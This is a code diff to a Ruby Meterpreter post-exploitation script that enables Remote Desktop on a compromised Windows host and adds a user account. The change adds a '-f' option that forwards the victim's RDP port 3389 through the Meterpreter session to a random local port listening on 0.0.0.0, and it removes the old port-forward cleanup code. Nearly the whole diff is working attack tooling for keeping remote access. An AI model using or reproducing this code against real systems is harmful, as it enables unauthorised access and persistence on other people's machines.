@@ -13,7 +13,8 @@ session = client
 	"-h" => [ false, "Help menu." ],
 	"-e" => [ false, "Enable RDP only." ],
 	"-p" => [ true,  "The Password of the user to add." ],
-	"-u" => [ true,  "The Username of the user to add." ]
+	"-u" => [ true,  "The Username of the user to add." ],
+	"-f" => [ true,  "Forward RDP Connection." ]
 )
 def usage
 	print_line("Windows Remote Desktop Enabler Meterpreter Script")
@@ -117,17 +118,7 @@ def addrdpusr(session, username, password)
 	end
 end
 
-module PortForwardTracker
-	def cleanup
-		super
 
-		if pfservice
-			pfservice.deref
-		end
-
-	end
-	attr_accessor :pfservice
-end
 
 
 def message
@@ -138,8 +129,10 @@ end
 # Parsing of Options
 usr = nil
 pass = nil
-lport = nil
+lport = 1024 + rand(1024)
 enbl = nil
+frwrd = nil
+
 @@exec_opts.parse(args) { |opt, idx, val|
 	case opt
 		when "-u"
@@ -148,8 +141,8 @@ enbl = nil
 			pass = val
 		when "-h"
 			usage
-		when "-n"
-			lport = val.to_i
+		when "-f"
+			frwrd = true
 		when "-e"
 			enbl = true
 		end
@@ -168,5 +161,9 @@ elsif usr != nil && pass != nil
 
 else
 	usage
+end
+if frwrd == true
+	print_status("Starting the port forwarding at local port #{lport}")
+	client.run_cmd("portfwd add -L 0.0.0.0 -l #{lport} -p 3389 -r 127.0.0.1")
 end
 
